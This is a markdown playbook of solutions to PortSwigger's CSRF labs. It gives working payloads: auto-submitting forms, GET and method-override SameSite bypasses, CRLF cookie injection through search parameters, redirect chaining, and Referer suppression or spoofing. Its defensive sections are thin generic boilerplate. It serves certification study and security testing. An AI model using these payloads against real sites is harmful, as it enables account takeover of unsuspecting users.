---
name: "CSRF — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1189"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# CSRF — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: No defenses 🟢 APPRENTICE
```html
<form action="https://TARGET/email/change" method="POST">
<input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```
---

### Lab 2: Token depends on request method 🟡 PRACTITIONER
Change `POST` to `GET`:
```html
<img src="https://TARGET/email/change?email=attacker@evil.com">
```
CSRF token only validated on POST, not GET.
---

### Lab 3: Token depends on being present 🟡 PRACTITIONER
Remove the `csrf` parameter entirely. Server only validates IF token is present.
---

### Lab 4: Token not tied to session 🟡 PRACTITIONER
Use YOUR valid CSRF token in the victim's request. Server validates token exists but not ownership.
---

### Lab 5: Token tied to non-session cookie 🟡 PRACTITIONER
Inject your `csrfKey` cookie via header injection:
```
/?search=test%0d%0aSet-Cookie:+csrfKey=YOUR_KEY
```
Then use your matching CSRF token.
---

### Lab 6: Token duplicated in cookie 🟡 PRACTITIONER
Cookie and parameter must match. Inject cookie:
```
/?search=test%0d%0aSet-Cookie:+csrf=fake
```
Use `csrf=fake` in form.
---

### Lab 7: SameSite Lax method override 🟡 PRACTITIONER
```html
<script>document.location='https://TARGET/email/change?email=attacker@evil.com&_method=POST';</script>
```
`_method=POST` overrides GET to POST on server side. SameSite=Lax allows GET.
---

### Lab 8: SameSite Strict client-side redirect 🟡 PRACTITIONER
Find an open redirect on the same domain, chain:
```
https://TARGET/post/comment/confirmation?postId=1/../../email/change?email=attacker@evil.com%26submit=1
```
---

### Lab 9: SameSite Strict sibling domain 🟡 PRACTITIONER
Find XSS on a sibling domain (e.g., cms.target.com) and use it to make same-site requests to target.com.
---

### Lab 10: SameSite Lax cookie refresh 🟡 PRACTITIONER
After OAuth login, the session cookie is fresh (< 2 min). SameSite=Lax allows top-level navigations within the 2-minute window.
---

### Lab 11: Referer depends on header being present 🟡 PRACTITIONER
```html
<meta name="referrer" content="no-referrer">
<form action="https://TARGET/email/change" method="POST">
<input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```
Suppress Referer entirely — server only checks IF present.
---

### Lab 12: Broken Referer validation 🟡 PRACTITIONER
```html
<script>history.pushState('','','/?TARGET.com');</script>
<form action="https://TARGET/email/change" method="POST">...</form>
```
Referer becomes `https://evil.com/?TARGET.com` which passes the substring check.
Add header: `Referrer-Policy: unsafe-url`
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
